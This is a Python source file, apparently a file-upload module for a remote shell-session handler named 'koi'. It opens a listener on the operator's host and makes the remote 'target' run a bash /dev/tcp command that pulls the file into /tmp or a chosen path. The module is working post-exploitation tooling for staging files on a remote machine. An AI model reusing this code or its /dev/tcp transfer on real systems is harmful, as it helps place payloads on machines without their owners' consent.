from __future__ import annotations

import os
import socket
import threading

from koi.modules.blueprint import KoiModule


class UploadModule(KoiModule):
    name = "upload"
    description = "Upload a local file to the target via a dedicated TCP connection."
    usage = "upload <id> <local_path> [-o <remote_path>]"
    category = "File transfer"
    arguments = [
        {"flags": ["local_path"], "help": "Path of the local file to upload"},
        {"flags": ["-o", "--output"], "default": None, "help": "Remote destination path"},
    ]

    def _get_local_ip(self) -> str:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((self.session.addr[0], 80))
            return s.getsockname()[0]
        finally:
            s.close()

    def run(self) -> None:
        local_path = self.args.local_path
        remote_path = self.args.output or f"/tmp/{os.path.basename(local_path)}"
        local_ip = self._get_local_ip()

        if not os.path.isfile(local_path):
            self.err(f"Local file not found: {local_path}")
            return

        with open(local_path, "rb") as f:
            raw = f.read()

        total = len(raw)

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        srv.listen(1)
        srv.settimeout(10)
        port = srv.getsockname()[1]

        error = []

        def _send():
            try:
                conn, _ = srv.accept()
                bar  = self.ui.ProgressBar(total=total)
                sent = 0
                while sent < total:
                    chunk     = raw[sent : sent + 65536]
                    conn.sendall(chunk)
                    sent     += len(chunk)
                    bar.update(sent)
                bar.done()
                conn.close()
            except Exception as exc:
                error.append(str(exc))
            finally:
                srv.close()

        t = threading.Thread(target=_send, daemon=True)
        t.start()

        self.status(f"Uploading {local_path} → {remote_path} ({total} bytes)…")
        self.exec(
            f"cat < /dev/tcp/{local_ip}/{port} > {remote_path}",
            timeout=30,
        )

        t.join(timeout=15)
        print()

        if error:
            self.err(f"Transfer failed: {error[0]}")
            return

        self.box("Upload complete", {
            "local path": os.path.abspath(local_path),
            "remote path": remote_path,
            "size": f"{total} bytes  ({total/1024:.1f} KB)",
        })